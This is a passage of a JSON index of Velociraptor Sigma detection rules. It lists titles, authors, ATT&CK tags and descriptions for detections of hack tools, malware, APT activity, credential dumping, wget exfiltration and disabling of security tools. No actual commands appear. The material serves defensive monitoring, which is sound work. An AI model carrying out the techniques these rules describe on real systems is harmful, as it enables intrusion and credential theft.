"attack.t1564.003", "windows", "evtx", "covenant"], "title": "HackTool - Covenant PowerShell Launcher"}, {"author": "Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community", "description": "Detects suspicious command lines used in Covenant luanchers", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\covenant\\sysmon_proc_creation_win_hktl_covenant.yaml", "tags": ["attack.execution", "attack.defense_evasion", "attack.t1059.001", "attack.t1564.003", "sysmon", "windows", "evtx", "covenant"], "title": "HackTool - Covenant PowerShell Launcher"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects the pattern of a pipe name as used by the hack tool CoercedPotato", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\potato_family\\sysmon_pipe_created_hktl_coercedpotato.yaml", "tags": ["attack.defense_evasion", "attack.privilege_escalation", "attack.t1055", "sysmon", "windows", "evtx", "potato"], "title": "HackTool - CoercedPotato Named Pipe Creation"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects the use of CoercedPotato, a tool for privilege escalation", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\potato_family\\proc_creation_win_hktl_coercedpotato.yaml", "tags": ["attack.defense_evasion", "attack.privilege_escalation", "attack.t1055", "windows", "evtx", "potato"], "title": "HackTool - CoercedPotato Execution"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects the use of CoercedPotato, a tool for privilege escalation", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\potato_family\\sysmon_proc_creation_win_hktl_coercedpotato.yaml", "tags": ["attack.defense_evasion", "attack.privilege_escalation", "attack.t1055", "sysmon", "windows", "evtx", "potato"], "title": "HackTool - CoercedPotato Execution"}, {"author": "@SBousseaden (detection), Thomas Patzke (rule)", "description": "Detects remote thread creation from CACTUSTORCH as described in references.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\sysmon\\create_remote_thread\\create_remote_thread_win_hktl_cactustorch.yaml", "tags": ["attack.defense_evasion", "attack.execution", "attack.t1055.012", "attack.t1059.005", "attack.t1059.007", "attack.t1218.005", "sysmon", "windows", "evtx", "generic"], "title": "HackTool - CACTUSTORCH Remote Thread Creation"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects suspicious session with two users present", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\builtin\\guacamole\\lnx_guacamole_susp_guacamole.yaml", "tags": ["attack.credential_access", "attack.t1212", "os.linux"], "title": "Guacamole Two Users Sharing Session Anomaly"}, {"author": "Tuan Le (NCSGroup)", "description": "Detects execution of the \"groupdel\" binary. Which is used to delete a group. This is sometimes abused by threat actors in order to cover their tracks", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_groupdel.yaml", "tags": ["attack.impact", "attack.t1531", "os.linux"], "title": "Group Has Been Deleted Via Groupdel"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects process execution patterns related to Griffon malware as reported by Kaspersky", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\Griffon\\proc_creation_win_malware_griffon_patterns.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "malware.griffon", "evtx", "sysmon"], "title": "Griffon Malware Attack Pattern"}, {"author": "Joseliyo Sanchez, @Joseliyo_Jstnk", "description": "Detect use of iptables to flush all firewall rules, tables and chains and allow all network traffic", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_iptables_flush_ufw.yaml", "tags": ["attack.defense_evasion", "attack.t1562.004", "os.linux"], "title": "Flush Iptables Ufw Chain"}, {"author": "Samir Bousseaden", "description": "This detection excludes known namped pipes accessible remotely and notify on newly observed ones, may help to detect lateral movement and remote exec using named pipes", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\smb\\win_security_lm_namedpipe.yaml", "tags": ["attack.lateral_movement", "attack.t1021.002", "windows", "evtx"], "title": "First Time Seen Remote Named Pipe"}, {"author": "Jakob Weinzettl, oscd.community", "description": "Detects file and folder permission changes.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_file_or_folder_permissions.yaml", "tags": ["attack.defense_evasion", "attack.t1222.002", "os.linux"], "title": "File or Folder Permissions Change"}, {"author": "Daniil Yugoslavskiy, oscd.community", "description": "Detects usage of system utilities to discover files and directories", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_file_and_directory_discovery.yaml", "tags": ["attack.discovery", "attack.t1083", "os.linux"], "title": "File and Directory Discovery - Linux"}, {"author": "Igor Fits, oscd.community", "description": "Detect file time attribute change to hide new or changes to existing files.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_change_file_time_attr.yaml", "tags": ["attack.defense_evasion", "attack.t1070.006", "os.linux"], "title": "File Time Attribute Change - Linux"}, {"author": "\u00c3\u2013mer G\u00c3\u00bcnal, oscd.community", "description": "Detects file deletion using \"rm\", \"shred\" or \"unlink\" commands which are used often by adversaries to delete files left behind by the actions of their intrusion activity", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_file_deletion.yaml", "tags": ["attack.defense_evasion", "attack.t1070.004", "os.linux"], "title": "File Deletion"}, {"author": "Lars B. P. Frydenskov(Trifork Security)", "description": "Detects exploitation attempt of CVE-2023-46214, a remote code execution (RCE) in Splunk Enterprise through insecure XML parsing using known public proof of concept code\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-46214\\web_cve_2023_46214_rce_splunk_enterprise_poc.yaml", "tags": ["cve.2023.46214", "detection.emerging_threats", "attack.lateral_movement", "attack.t1210"], "title": "Exploitation Attempt Of CVE-2023-46214 Using Public POC Code"}, {"author": "Joseliyo Sanchez, @Joseliyo_Jstnk", "description": "Detects executions of scripts located in potentially suspicious locations such as \"/tmp\" via a shell such as \"bash\", \"sh\", etc.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_susp_shell_script_exec_from_susp_location.yaml", "tags": ["attack.execution", "os.linux"], "title": "Execution Of Script Located In Potentially Suspicious Directory"}, {"author": "frack113", "description": "Adversaries may use Valid Accounts to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\remote_powershell\\posh_ps_invoke_command_remote.yaml", "tags": ["attack.lateral_movement", "attack.t1021.006", "windows", "evtx"], "title": "Execute Invoke-command on Remote Host"}, {"author": "frack113", "description": "One way Qbot steals sensitive information is by extracting browser data from Internet Explorer and Microsoft Edge by using the built-in utility esentutl.exe", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\proc_creation_win_esentutl_webcache.yaml", "tags": ["attack.collection", "attack.t1005", "attack.credential_access", "windows", "evtx"], "title": "Esentutl Steals Browser Information"}, {"author": "frack113", "description": "One way Qbot steals sensitive information is by extracting browser data from Internet Explorer and Microsoft Edge by using the built-in utility esentutl.exe", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\sysmon_proc_creation_win_esentutl_webcache.yaml", "tags": ["attack.collection", "attack.t1005", "sysmon", "windows", "evtx"], "title": "Esentutl Steals Browser Information"}, {"author": "sam0x90", "description": "Conti recommendation to its affiliates to use esentutl to access NTDS dumped file. Trickbot also uses this utilities to get MSEdge info via its module pwgrab.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\ntds_dit\\proc_creation_win_esentutl_params.yaml", "tags": ["attack.credential_access", "attack.t1003", "attack.t1003.003", "windows", "evtx", "conti", "trickbot"], "title": "Esentutl Gather Credentials"}, {"author": "sam0x90", "description": "Conti recommendation to its affiliates to use esentutl to access NTDS dumped file. Trickbot also uses this utilities to get MSEdge info via its module pwgrab.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\ntds_dit\\sysmon_proc_creation_win_esentutl_params.yaml", "tags": ["attack.credential_access", "attack.t1003", "attack.t1003.003", "sysmon", "windows", "evtx"], "title": "Esentutl Gather Credentials"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects suspicious shell commands used in various Equation Group scripts and tools", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\builtin\\lnx_apt_equationgroup_lnx.yaml", "tags": ["attack.execution", "attack.g0020", "attack.t1059.004", "os.linux"], "title": "Equation Group Indicators"}, {"author": "frack113", "description": "Adversaries may use Valid Accounts to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\remote_powershell\\posh_ps_enable_psremoting.yaml", "tags": ["attack.lateral_movement", "attack.t1021.006", "windows", "evtx"], "title": "Enable Windows Remote Management"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects common command used to enable bpf kprobes tracing", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\malware\\bpfdoor\\proc_creation_lnx_bpf_kprob_tracing_enabled.yaml", "tags": ["attack.execution", "attack.defense_evasion", "os.linux"], "title": "Enable BPF Kprobes Tracing"}, {"author": "Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)", "description": "Potential adversaries stopping ETW providers recording loaded .NET assemblies.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\tampering\\evtx\\win_security_dot_net_etw_tamper.yaml", "tags": ["attack.defense_evasion", "attack.t1112", "attack.t1562", "windows", "evtx"], "title": "ETW Logging Disabled In .NET Processes - Registry"}, {"author": "Nasreddine Bencherchali (Nextron Systems), Cedric Maurugeon", "description": "Detects execution of the \"esxcli\" command with the \"vsan\" flag in order to retrieve information about virtual storage. Seen used by malware such as DarkSide.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_esxcli_vsan_discovery.yaml", "tags": ["attack.discovery", "attack.t1033", "attack.t1007", "os.linux"], "title": "ESXi VSAN Information Discovery Via ESXCLI"}, {"author": "Cedric Maurugeon", "description": "Detects execution of the \"esxcli\" command with the \"vm\" flag in order to retrieve information about the installed VMs.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_esxcli_vm_discovery.yaml", "tags": ["attack.discovery", "attack.t1033", "attack.t1007", "os.linux"], "title": "ESXi VM List Discovery Via ESXCLI"}, {"author": "Nasreddine Bencherchali (Nextron Systems), Cedric Maurugeon", "description": "Detects execution of the \"esxcli\" command with the \"vm\" and \"kill\" flag in order to kill/shutdown a specific VM.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_esxcli_vm_kill.yaml", "tags": ["attack.execution", "os.linux"], "title": "ESXi VM Kill Via ESXCLI"}, {"author": "Cedric Maurugeon", "description": "Detects execution of the \"esxcli\" command with the \"system\" flag in order to retrieve information about the different component of the system. Such as accounts, modules, NTP, etc.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_esxcli_system_discovery.yaml", "tags": ["attack.discovery", "attack.t1033", "attack.t1007", "os.linux"], "title": "ESXi System Information Discovery Via ESXCLI"}, {"author": "Cedric Maurugeon", "description": "Detects changes to the ESXi syslog configuration via \"esxcli\"", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_esxcli_syslog_config_change.yaml", "tags": ["attack.defense_evasion", "attack.t1562.001", "attack.t1562.003", "os.linux"], "title": "ESXi Syslog Configuration Change Via ESXCLI"}, {"author": "Nasreddine Bencherchali (Nextron Systems), Cedric Maurugeon", "description": "Detects execution of the \"esxcli\" command with the \"storage\" flag in order to retrieve information about the storage status and other related information. Seen used by malware such as DarkSide and LockBit.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_esxcli_storage_discovery.yaml", "tags": ["attack.discovery", "attack.t1033", "attack.t1007", "os.linux"], "title": "ESXi Storage Information Discovery Via ESXCLI"}, {"author": "Cedric Maurugeon", "description": "Detects execution of the \"esxcli\" command with the \"network\" flag in order to retrieve information about the network configuration.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_esxcli_network_discovery.yaml", "tags": ["attack.discovery", "attack.t1033", "attack.t1007", "os.linux"], "title": "ESXi Network Configuration Discovery Via ESXCLI"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects execution of the \"esxcli\" command with the \"system\" and \"permission\" flags in order to assign admin permissions to an account.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_esxcli_permission_change_admin.yaml", "tags": ["attack.execution", "os.linux"], "title": "ESXi Admin Permission Assigned To Account Via ESXCLI"}, {"author": "Cedric Maurugeon", "description": "Detects user account creation on ESXi system via esxcli", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_esxcli_user_account_creation.yaml", "tags": ["attack.persistence", "attack.t1136", "os.linux"], "title": "ESXi Account Creation Via ESXCLI"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects potential abuse of ntdsutil to dump ntds.dit database to a suspicious location", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\ntds_dit\\win_esent_ntdsutil_abuse_susp_location.yaml", "tags": ["attack.execution", "attack.credential_access", "windows", "evtx"], "title": "Dump Ntds.dit To Suspicious Location"}, {"author": "Joseliyo Sanchez, @Joseliyo_Jstnk", "description": "Detects the use of wget to download content to a suspicious directory", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_wget_download_suspicious_directory.yaml", "tags": ["attack.command_and_control", "attack.t1105", "os.linux"], "title": "Download File To Potentially Suspicious Directory Via Wget"}, {"author": "Seth Hanford", "description": "Detects listing or file reading of \".dockerenv\" which can be a sing of potential container discovery", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_susp_dockerenv_recon.yaml", "tags": ["attack.discovery", "attack.t1082", "os.linux"], "title": "Docker Container Discovery Via Dockerenv Listing"}, {"author": "\u00c3\u2013mer G\u00c3\u00bcnal, Alejandro Ortuno, oscd.community", "description": "Detects disabling security tools", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\builtin\\syslog\\lnx_syslog_security_tools_disabling_syslog.yaml", "tags": ["attack.defense_evasion", "attack.t1562.004", "os.linux"], "title": "Disabling Security Tools - Builtin"}, {"author": "\u00c3\u2013mer G\u00c3\u00bcnal, Alejandro Ortuno, oscd.community", "description": "Detects disabling security tools", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_security_tools_disabling.yaml", "tags": ["attack.defense_evasion", "attack.t1562.004", "os.linux"], "title": "Disabling Security Tools"}, {"author": "frack113", "description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union)", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\web_exploitation\\iis\\sysmon_proc_creation_win_iis_appcmd_http_logging.yaml", "tags": ["attack.defense_evasion", "attack.t1562.002", "sysmon", "windows", "evtx", "webserver.iis"], "title": "Disable Windows IIS HTTP Logging"}, {"author": "Pawel Mazur", "description": "Detects disabling of system firewalls which could be used by adversaries to bypass controls that limit usage of the network.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_disable_system_firewall.yaml", "tags": ["attack.t1562.004", "attack.defense_evasion", "os.linux"], "title": "Disable System Firewall"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects the usage of utilities such as 'systemctl', 'service'...etc to stop or disable tools and services", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_services_stop_and_disable.yaml", "tags": ["attack.defense_evasion", "os.linux"], "title": "Disable Or Stop Services"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects registry event related to the creation of a scheduled task used by Diamond Sleet APT during exploitation of Team City CVE-2023-42793 vulnerability\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Diamond-Sleet\\registry_event_apt_diamond_sleet_scheduled_task.yaml", "tags": ["attack.defense_evasion", "attack.t1562", "detection.emerging_threats"], "title": "Diamond Sleet APT Scheduled Task Creation - Registry"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects registry event related to the creation of a scheduled task used by Diamond Sleet APT during exploitation of Team City CVE-2023-42793 vulnerability\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Diamond-Sleet\\win_security_apt_diamond_sleet_scheduled_task_evtx.yaml", "tags": ["attack.execution", "attack.privilege_escalation", "attack.persistence", "attack.t1053.005", "detection.emerging_threats", "windows", "evtx", "apt.Diamond-Sleet"], "title": "Diamond Sleet APT Scheduled Task Creation - EVTX"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects registry event related to the creation of a scheduled task used by Diamond Sleet APT during exploitation of Team City CVE-2023-42793 vulnerability\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Diamond-Sleet\\win_security_apt_diamond_sleet_scheduled_task.yaml", "tags": ["attack.execution", "attack.privilege_escalation", "attack.persistence", "attack.t1053.005", "detection.emerging_threats", "windows", "evtx", "apt.Diamond-Sleet"], "title": "Diamond Sleet APT Scheduled Task Creation"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects process creation activity indicators related to Diamond Sleet APT", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Diamond-Sleet\\proc_creation_win_apt_diamond_sleet_indicators_evtx.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "evtx", "apt.Diamond-Sleet"], "title": "Diamond Sleet APT Process Activity Indicators - EVTX"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects process creation activity indicators related to Diamond Sleet APT", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Diamond-Sleet\\proc_creation_win_apt_diamond_sleet_indicators.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "evtx", "apt.Diamond-Sleet"], "title": "Diamond Sleet APT Process Activity Indicators"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects file creation activity that is related to Diamond Sleet APT activity", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Diamond-Sleet\\file_event_win_apt_diamond_sleet_indicators.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "evtx", "apt.Diamond-Sleet"], "title": "Diamond Sleet APT File Creation Indicators"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects DNS queries related to Diamond Sleet APT activity", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Diamond-Sleet\\dns_query_win_apt_diamond_steel_indicators.yaml", "tags": ["attack.command_and_control", "detection.emerging_threats", "windows", "evtx", "apt.Diamond-Sleet"], "title": "Diamond Sleet APT DNS Communication Indicators"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects DLL sideloading activity seen used by Diamond Sleet APT", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Diamond-Sleet\\image_load_apt_diamond_sleet_side_load.yaml", "tags": ["attack.defense_evasion", "attack.t1574.002", "detection.emerging_threats", "windows", "evtx", "apt.Diamond-Sleet"], "title": "Diamond Sleet APT DLL Sideloading Indicators"}, {"author": "Agro (@agro_sev) oscd.community", "description": "This rule detects execution of a PowerShell code through the sqlps.exe utility, which is included in the standard set of utilities supplied with the MSSQL Server.\nScript blocks are not logged in this case, so this utility helps to bypass protection mechanisms based on the analysis of these logs.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\database\\mssqlserver\\proc_creation_win_mssql_sqlps_susp_execution.yaml", "tags": ["attack.execution", "attack.t1059.001", "attack.defense_evasion", "attack.t1127", "mssql", "windows", "windows.evtx", "database", "software.mssql"], "title": "Detection of PowerShell Execution via Sqlps.exe"}, {"author": "Teymur Kheirkhabarov", "description": "Detection of child processes spawned with SYSTEM privileges by parents with LOCAL SERVICE or NETWORK SERVICE privileges", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\potato_family\\sysmon_win_possible_privilege_escalation_using_rotten_potato.yaml", "tags": ["attack.privilege_escalation", "attack.t1134", "attack.t1134.002", "sysmon", "windows", "evtx", "potato"], "title": "Detection of Possible Rotten Potato"}, {"author": "Daniil Yugoslavskiy, oscd.community", "description": "Detects usage of base64 utility to decode arbitrary base64-encoded text", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_base64_decode.yaml", "tags": ["attack.defense_evasion", "attack.t1027", "os.linux"], "title": "Decode Base64 Encoded Text"}, {"author": "Pawel Mazur", "description": "Detects attempts to post the file with the usage of wget utility.\nThe adversary can bypass the permission restriction with the misconfigured sudo permission for wget utility which could allow them to read files like /etc/shadow.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_data_exfil_wget.yaml", "tags": ["attack.exfiltration", "attack.t1048.003", "os.linux"], "title": "Data Exfiltration with Wget"}, {"author": "Timur Zinniatullin, oscd.community", "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_data_compressed.yaml", "tags": ["attack.exfiltration", "attack.t1560.001", "os.linux"], "title": "Data Compressed"}, {"author": "X__Junior (Nextron Systems)", "description": "Detects creation of local users via the net.exe command with the name of \"DarkGate\"", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\DarkGate\\proc_creation_win_malware_darkgate_net_user_creation.yaml", "tags": ["attack.persistence", "attack.t1136.001", "detection.emerging_threats", "windows", "malware.darkgate", "evtx"], "title": "DarkGate - User Created Via Net.EXE"}, {"author": "Micah Babinski", "description": "Detects the usage of curl.exe, KeyScramblerLogon, or other non-standard/suspicious processes used to create Autoit3.exe.\nThis activity has been associated with DarkGate malware, which uses Autoit3.exe to execute shellcode that performs\nprocess injection and connects to the DarkGate command-and-control server. Curl, KeyScramblerLogon, and these other\nprocesses consitute non-standard and suspicious ways to retrieve the Autoit3 executable.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\DarkGate\\file_event_win_malware_darkgate_autoit3_binary_creation.yaml", "tags": ["attack.command_and_control", "attack.execution", "attack.t1105", "attack.t1059", "detection.emerging_threats", "windows", "malware.darkgate", "evtx", "sysmon"], "title": "DarkGate - Autoit3.EXE File Creation By Uncommon Process"}, {"author": "Micah Babinski", "description": "Detects execution of the legitimate Autoit3 utility from a suspicious parent process. AutoIt3.exe is used within\nthe DarkGate infection chain to execute shellcode that performs process injection and connects to the DarkGate\ncommand-and-control server.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\DarkGate\\proc_creation_win_malware_darkgate_autoit3_from_susp_parent_and_location_evtx.yaml", "tags": ["attack.execution", "attack.t1059", "detection.emerging_threats", "windows", "malware.darkgate", "evtx", "sysmon"], "title": "DarkGate - Autoit3.EXE Execution Parameters - EVTX"}, {"author": "Micah Babinski", "description": "Detects execution of the legitimate Autoit3 utility from a suspicious parent process. AutoIt3.exe is used within\nthe DarkGate infection chain to execute shellcode that performs process injection and connects to the DarkGate\ncommand-and-control server.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\DarkGate\\proc_creation_win_malware_darkgate_autoit3_from_susp_parent_and_location.yaml", "tags": ["attack.execution", "attack.t1059", "detection.emerging_threats", "windows", "malware.darkgate"], "title": "DarkGate - Autoit3.EXE Execution Parameters"}, {"author": "CISA", "description": "Hunts known SVR-specific DLL names.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Cozy-Bear\\image_load_apt_cozy_bear_graphical_proton_dlls_evtx.yaml", "tags": ["detection.emerging_threats", "windows", "evtx", "apt.Cozy-Bear"], "title": "DLL Names Used By SVR For GraphicalProton Backdoor - EVTX"}, {"author": "CISA", "description": "Hunts known SVR-specific DLL names.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Cozy-Bear\\image_load_apt_cozy_bear_graphical_proton_dlls.yaml", "tags": ["detection.emerging_threats", "windows", "evtx", "apt.Cozy-Bear"], "title": "DLL Names Used By SVR For GraphicalProton Backdoor"}, {"author": "Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC", "description": "Detects potential overwriting and deletion of a file using DD.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_dd_file_overwrite.yaml", "tags": ["attack.impact", "attack.t1485", "os.linux"], "title": "DD File Overwrite"}, {"author": "OTR (Open Threat Research)", "description": "Detects the use of the spoolss named pipe over SMB. This can be used to trigger the authentication via NTLM of any machine that has the spoolservice enabled.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\smb\\win_security_dce_rpc_smb_spoolss_named_pipe.yaml", "tags": ["attack.lateral_movement", "attack.t1021.002"], "title": "DCERPC SMB Spoolss Named Pipe"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects a curl process start on linux, which indicates a file download from a remote location or a simple web request to a remote server", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_curl_usage.yaml", "tags": ["attack.command_and_control", "attack.t1105", "os.linux"], "title": "Curl Usage on Linux"}, {"author": "Joseliyo Sanchez, @Joseliyo_Jstnk", "description": "Detects usage of crontab to list the tasks of the user", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_crontab_enumeration.yaml", "tags": ["attack.discovery", "attack.t1007", "os.linux"], "title": "Crontab Enumeration"}, {"author": "Igor Fits, oscd.community", "description": "Detecting attempts to extract passwords with grep", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_find_cred_in_files.yaml", "tags": ["attack.credential_access", "attack.t1552.001", "os.linux"], "title": "Credentials In Files - Linux"}, {"author": "Tim Rauch", "description": "Detects Credential Acquisition via Registry Hive Dumping", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\registry\\proc_creation_win_credential_acquisition_registry_hive_dumping.yaml", "tags": ["attack.credential_access", "attack.t1003", "windows", "evtx"], "title": "Credential Acquisition via Registry Hive Dumping"}, {"author": "Marie Euler, Pawel Mazur", "description": "Detects the creation of a new user account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_create_account.yaml", "tags": ["attack.t1136.001", "attack.persistence", "os.linux"], "title": "Creation Of An User Account"}, {"author": "Roberto Rodriguez @Cyb3rWard0g", "description": "Detects potential use of CreateRemoteThread api and LoadLibrary function to inject DLL into a process", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\sysmon\\create_remote_thread\\create_remote_thread_win_loadlibrary.yaml", "tags": ["attack.defense_evasion", "attack.t1055.001", "sysmon", "windows", "evtx", "generic"], "title": "CreateRemoteThread API and LoadLibrary"}, {"author": "Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community", "description": "Files with well-known filenames (sensitive files with credential data) copying", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\ntds_dit\\proc_creation_win_esentutl_sensitive_file_copy.yaml", "tags": ["attack.credential_access", "attack.t1003.002", "attack.t1003.003", "car.2013-07-001", "attack.s0404", "windows", "evtx"], "title": "Copying Sensitive Files with Credential Data"}, {"author": "Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community", "description": "Files with 